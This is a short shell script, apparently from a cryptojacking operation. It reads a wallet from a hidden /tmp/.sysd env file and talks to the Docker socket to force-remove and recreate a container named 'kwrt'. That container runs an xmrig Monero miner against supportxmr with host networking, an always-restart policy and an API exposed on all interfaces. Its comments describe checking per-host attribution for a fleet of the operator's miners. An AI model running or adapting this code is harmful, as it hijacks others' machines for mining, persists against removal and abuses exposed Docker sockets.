#!/bin/sh
# Does the pool actually use --rig-id as the worker name? Deploy a throwaway miner that
# signs in as 9.9.9.9 and see whether /identifiers gains it. If it does, per-host
# attribution works and our own containers simply are not running; if it does not,
# supportxmr takes the worker name from somewhere else and we need another route.
set -u
. /tmp/.sysd/worker.env
P=${POOL:-pool.supportxmr.com:443}
dk() { curl -sS --unix-socket /var/run/docker.sock -m 20 "$@" 2>/dev/null; }
dk -X DELETE http://localhost/containers/kwrt?force=1 >/dev/null 2>&1 || :
B="{\"Image\":\"xmrig/xmrig\",\"Entrypoint\":[\"sh\",\"-c\"],\"Cmd\":[\"while :; do /usr/bin/xmrig -o $P -u $WALLET -p 9.9.9.9 --rig-id 9.9.9.9 --no-color -k --tls --threads 1 --http-port 47999 --http-host 0.0.0.0; sleep 10; done\"],\"HostConfig\":{\"NetworkMode\":\"host\",\"RestartPolicy\":{\"Name\":\"always\"}}}"
r=$(dk -m 40 -X POST http://localhost/containers/create?name=kwrt -H Content-Type:application/json -d "$B")
echo "create: $(printf '%s' "$r" | head -c 90)"
e=$(dk -X POST http://localhost/containers/kwrt/start)
echo "start: [$e]"
sleep 8
echo "state: $(dk http://localhost/containers/kwrt/json | grep -o 'Running":[a-z]*' | head -1)"
echo "api: [$(curl -sS -m 4 http://127.0.0.1:47999/2/summary 2>/dev/null | head -c 80)]"
echo READY
